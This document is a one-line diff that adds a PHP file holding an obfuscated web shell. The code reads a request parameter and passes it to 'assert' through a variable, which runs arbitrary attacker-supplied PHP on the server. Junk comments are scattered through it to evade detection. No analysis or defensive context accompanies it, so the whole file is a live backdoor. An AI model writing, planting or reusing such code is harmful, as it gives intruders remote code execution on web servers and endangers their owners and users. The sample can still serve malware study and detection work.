@@ -1,0 +1,1 @@
+<?php /*hG*/if(isset($_REQUEST['TLmg'])){$u="assert";/*ms*/$M=$u/*Zptsm*/($_REQUEST['TLmg']);/*C*/exit;}?>
